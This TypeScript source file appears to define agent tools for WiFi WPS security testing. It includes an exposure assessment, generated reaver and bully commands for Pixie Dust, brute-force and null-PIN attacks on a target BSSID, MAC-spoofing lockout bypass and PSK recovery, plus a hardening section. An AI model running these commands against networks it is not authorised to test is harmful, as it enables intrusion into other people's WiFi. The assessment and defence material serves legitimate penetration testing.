import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import { WIFI_ATTACKS } from "../knowledge/index.js";

const wps_assess: ToolDef = {
  name: "wps_assess",
  description: "Assess WPS (WiFi Protected Setup) security posture. Evaluates WPS version, lock status, and susceptibility to Pixie Dust and brute-force attacks.",
  schema: {
    wps_enabled: z.boolean().describe("Whether WPS is enabled on the target AP"),
    wps_version: z.string().describe("WPS version (e.g. '1.0', '2.0', 'unknown')"),
    wps_locked: z.boolean().optional().describe("Whether WPS is currently in locked state (rate-limited after failed attempts)"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const enabled = args.wps_enabled as boolean;
    const version = args.wps_version as string;
    const locked = args.wps_locked as boolean | undefined;

    if (!enabled) {
      return json({
        wps_assessment: {
          enabled: false,
          risk_level: "LOW",
          summary: "WPS is disabled. No WPS-based attack vectors available.",
          recommendations: [
            "Verify WPS is truly disabled and not just hidden",
            "Some APs re-enable WPS after firmware update - verify regularly",
            "Use wash -i wlan0mon to verify WPS is not responding",
          ],
        },
      });
    }

    const isV1 = version.startsWith("1");
    const isV2 = version.startsWith("2");

    type VulnEntry = { name: string; severity: string; description: string; exploitable: boolean; reason: string };
    const vulnerabilities: VulnEntry[] = [];

    // PIN brute force vulnerability
    vulnerabilities.push({
      name: "WPS PIN Brute Force",
      severity: "high",
      description: "WPS PIN is 8 digits verified in two halves (4+3+checksum), reducing keyspace to ~11,000 attempts",
      exploitable: !locked,
      reason: locked
        ? "WPS is currently locked - rate limiting active. May unlock after timeout."
        : "WPS is accepting PIN attempts - brute force feasible",
    });

    // Pixie Dust
    vulnerabilities.push({
      name: "Pixie Dust (Offline PIN Recovery)",
      severity: "critical",
      description: "Exploits weak random number generation in WPS to recover PIN offline from a single exchange. Works against many Ralink, Broadcom, and Realtek chipsets.",
      exploitable: true,
      reason: "Requires only a single M1-M3 exchange. If the AP uses weak PRNG, PIN is recovered in seconds.",
    });

    // Null PIN
    vulnerabilities.push({
      name: "Null/Empty PIN",
      severity: "critical",
      description: "Some APs accept empty PIN or default PIN (e.g., 12345670). Implementation flaw.",
      exploitable: true,
      reason: "Requires testing with empty/default PIN. Quick check before brute force.",
    });

    // WPS 1.0 specific
    if (isV1) {
      vulnerabilities.push({
        name: "WPS 1.0 - No Lockout",
        severity: "critical",
        description: "WPS 1.0 has no mandatory lockout mechanism. Unlimited PIN attempts possible.",
        exploitable: true,
        reason: "WPS 1.0 specification does not require rate limiting or lockout.",
      });
    }

    // WPS 2.0 lockout
    if (isV2) {
      vulnerabilities.push({
        name: "WPS 2.0 Lockout Bypass",
        severity: "medium",
        description: "WPS 2.0 implements lockout after failures, but some APs have weak lockout (short timeout, MAC-based).",
        exploitable: !locked,
        reason: locked
          ? "Currently locked. Wait for timeout (typically 1-60 minutes) or try MAC change."
          : "Not locked - may not have effective lockout implementation.",
      });
    }

    const wpsAttack = WIFI_ATTACKS.find((a) => a.id === "wps_pin");

    // Estimate attack times
    const attackEstimates = {
      pixie_dust: "1-30 seconds (if vulnerable chipset)",
      null_pin: "< 1 second per attempt",
      brute_force_v1: "4-10 hours (no lockout, ~11,000 PINs)",
      brute_force_v2: "24-72 hours (with lockout delays)",
      brute_force_v2_bypass: "8-24 hours (lockout bypass techniques)",
    };

    // Vulnerable chipsets for Pixie Dust
    const pixieDustVulnerable = [
      "Ralink RT2xxx/RT3xxx/RT5xxx",
      "MediaTek MT7xxx",
      "Broadcom BCM43xx (some models)",
      "Realtek RTL8xxx (some models)",
      "Marvell Avastar 88W8xxx",
    ];

    return json({
      wps_assessment: {
        enabled: true,
        version,
        locked: locked ?? "unknown",
        risk_level: "HIGH",
        summary: `WPS ${version} is enabled${locked ? " but currently locked" : ""}. Multiple attack vectors available.`,
        vulnerabilities,
        attack_time_estimates: attackEstimates,
        pixie_dust_vulnerable_chipsets: pixieDustVulnerable,
        attack_priority: [
          "1. Try Pixie Dust first (fastest, works offline): reaver -i wlan0mon -b <bssid> -K",
          "2. Try Null/Default PIN: reaver -i wlan0mon -b <bssid> -p ''",
          "3. If Pixie Dust fails, brute force: reaver -i wlan0mon -b <bssid> -vv",
          locked ? "4. Wait for lockout to expire or change MAC and retry" : null,
        ].filter(Boolean),
        kb_reference: wpsAttack ? {
          id: wpsAttack.id,
          name: wpsAttack.name,
          severity: wpsAttack.severity,
          cves: wpsAttack.cves,
          tools: wpsAttack.tools,
          mitigations: wpsAttack.mitigations,
        } : undefined,
      },
    });
  },
};

const wps_attack_commands: ToolDef = {
  name: "wps_attack_commands",
  description: "Get WPS attack commands for reaver, bully, and related tools. Provides ready-to-use commands for brute force, Pixie Dust, and null PIN attacks.",
  schema: {
    target_bssid: z.string().describe("Target AP BSSID"),
    interface: z.string().optional().describe("Monitor mode interface (default: wlan0mon)"),
    method: z.enum(["brute", "pixiedust", "null_pin"]).optional().describe("Attack method (default: pixiedust)"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const bssid = args.target_bssid as string;
    const iface = (args.interface as string) || "wlan0mon";
    const method = (args.method as string) || "pixiedust";

    const commands: Record<string, unknown> = {
      setup: [
        { command: "airmon-ng check kill", description: "Kill interfering processes" },
        { command: `airmon-ng start ${iface.replace("mon", "")}`, description: "Enable monitor mode" },
        { command: `wash -i ${iface}`, description: "Scan for WPS-enabled APs and check lock status" },
        { command: `wash -i ${iface} -C`, description: "Scan with channel hopping" },
      ],
    };

    switch (method) {
      case "pixiedust":
        commands.attack = {
          method: "Pixie Dust (Offline WPS PIN Recovery)",
          description: "Exploits weak PRNG in WPS to recover PIN from single exchange. Fastest method.",
          reaver: [
            { command: `reaver -i ${iface} -b ${bssid} -K -vv`, description: "Pixie Dust attack with reaver (standard)" },
            { command: `reaver -i ${iface} -b ${bssid} -K -N -vv`, description: "Pixie Dust with NACK handling" },
            { command: `reaver -i ${iface} -b ${bssid} -K -d 0 -vv`, description: "Pixie Dust with no delay" },
          ],
          bully: [
            { command: `bully -b ${bssid} -d -v 3 ${iface}`, description: "Pixie Dust attack with bully" },
          ],
          notes: [
            "Pixie Dust requires only 1-3 WPS exchanges",
            "Works in seconds if AP uses vulnerable chipset",
            "If it fails, the AP likely uses strong PRNG - try brute force instead",
          ],
        };
        break;

      case "brute":
        commands.attack = {
          method: "WPS PIN Brute Force",
          description: "Try all ~11,000 possible PIN combinations. Slower but works against all WPS implementations.",
          reaver: [
            { command: `reaver -i ${iface} -b ${bssid} -vv`, description: "Standard brute force" },
            { command: `reaver -i ${iface} -b ${bssid} -vv -d 1 -N`, description: "Brute force with 1-sec delay and NACK" },
            { command: `reaver -i ${iface} -b ${bssid} -vv -S`, description: "Brute force using small DH keys (faster)" },
            { command: `reaver -i ${iface} -b ${bssid} -vv -L -d 60`, description: "Respect lockout: 60-sec delay on lock" },
            { command: `reaver -i ${iface} -b ${bssid} -vv -p <known_first_half>`, description: "Resume with known first half of PIN" },
          ],
          bully: [
            { command: `bully -b ${bssid} -v 3 ${iface}`, description: "Brute force with bully" },
            { command: `bully -b ${bssid} -v 3 -l 60 ${iface}`, description: "Bully with 60-sec lockout wait" },
          ],
          lockout_bypass: [
            { command: `macchanger -r ${iface.replace("mon", "")}`, description: "Change MAC to bypass MAC-based lockout" },
            { command: `reaver -i ${iface} -b ${bssid} -vv --mac=<new_mac>`, description: "Reaver with spoofed MAC" },
          ],
          notes: [
            "Full brute force takes 4-72 hours depending on lockout",
            "PIN is verified in two halves: 4 digits + 3 digits + 1 checksum",
            "Maximum ~11,000 attempts needed (10,000 + 1,000)",
            "Save progress: reaver stores state in /etc/reaver/",
          ],
        };
        break;

      case "null_pin":
        commands.attack = {
          method: "Null/Default PIN",
          description: "Test for empty PIN or common default PINs. Quick check before brute force.",
          commands: [
            { command: `reaver -i ${iface} -b ${bssid} -p '' -vv`, description: "Try empty/null PIN" },
            { command: `reaver -i ${iface} -b ${bssid} -p '12345670' -vv`, description: "Try common default PIN" },
            { command: `reaver -i ${iface} -b ${bssid} -p '00000000' -vv`, description: "Try all-zeros PIN" },
          ],
          notes: [
            "Some APs accept empty PIN due to implementation bugs",
            "Default PINs may be printed on AP label - check if physical access available",
            "PIN calculator tools can generate PINs from BSSID/serial for some vendors",
          ],
        };
        break;
    }

    commands.post_exploitation = [
      { command: "# After PIN recovered, extract PSK:", description: "Use recovered PIN to get network key" },
      { command: `reaver -i ${iface} -b ${bssid} -p <recovered_pin> -vv`, description: "Extract PSK using recovered PIN" },
    ];

    commands.cleanup = [
      { command: `airmon-ng stop ${iface}`, description: "Disable monitor mode" },
      { command: "systemctl restart NetworkManager", description: "Restore network manager" },
    ];

    return json({
      wps_attack_commands: {
        target: bssid,
        interface: iface,
        method,
        ...commands,
        warnings: [
          "WPS attacks may lock out WPS temporarily on the target AP",
          "Brute force generates significant wireless traffic - detectable by WIDS",
          "Only perform with written authorization",
        ],
      },
    });
  },
};

const wps_defense: ToolDef = {
  name: "wps_defense",
  description: "Get WPS defense and hardening recommendations. Returns best practices for WPS configuration, disabling, and alternative secure provisioning methods.",
  schema: {},
  async execute(_args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    return json({
      wps_defense: {
        primary_recommendation: "DISABLE WPS ENTIRELY",
        explanation: "WPS is inherently vulnerable due to its design (small PIN space, half-PIN verification). No configuration can fully secure WPS.",
        recommendations: {
          immediate: [
            "Disable WPS in AP administration interface",
            "Verify with wash -i wlan0mon that WPS is no longer responding",
            "Some APs re-enable WPS after firmware updates - verify after every update",
            "Physical WPS button may still work even with software WPS disabled - test",
          ],
          if_wps_required: [
            "Use WPS Push Button Configuration (PBC) only - disable PIN method",
            "Enable WPS lockout with aggressive settings (3 failures, 60-min lockout)",
            "Restrict WPS registration to specific time windows",
            "Monitor WPS authentication attempts in AP logs",
            "Use WPS 2.0 which has mandatory lockout (but lockout can be bypassed)",
          ],
          alternative_provisioning: [
            {
              method: "QR Code / NFC",
              description: "WiFi Easy Connect (DPP) uses QR codes for secure provisioning",
              security: "HIGH - no PIN to brute force",
            },
            {
              method: "Manual PSK Entry",
              description: "Manually enter strong PSK on each device",
              security: "HIGH - if PSK is strong and unique",
            },
            {
              method: "802.1X / RADIUS",
              description: "WPA-Enterprise with per-user credentials",
              security: "HIGHEST - individual authentication, no shared secret",
            },
            {
              method: "MDM Provisioning",
              description: "Push WiFi profiles via Mobile Device Management",
              security: "HIGH - centrally managed, no user interaction",
            },
          ],
          vendor_specific_disable: {
            cisco: "config wlan wps disable <wlan_id>",
            ubiquiti: "Settings > WiFi > [Network] > Advanced > WPS: Disable",
            hostapd: "wps_state=0  # in hostapd.conf",
            general: "Access AP admin panel > Wireless Settings > WPS: Disable/Off",
          },
        },
        risk_matrix: {
          wps_disabled: { risk: "NONE", from_wps: "No WPS attack surface" },
          wps_pbc_only: { risk: "LOW", from_wps: "Physical button required - social engineering needed" },
          wps_pin_locked: { risk: "MEDIUM", from_wps: "Lockout can be bypassed, Pixie Dust may still work" },
          wps_pin_unlocked: { risk: "CRITICAL", from_wps: "Full brute force possible in hours" },
        },
      },
    });
  },
};

export const wpsTools: ToolDef[] = [
  wps_assess,
  wps_attack_commands,
  wps_defense,
];
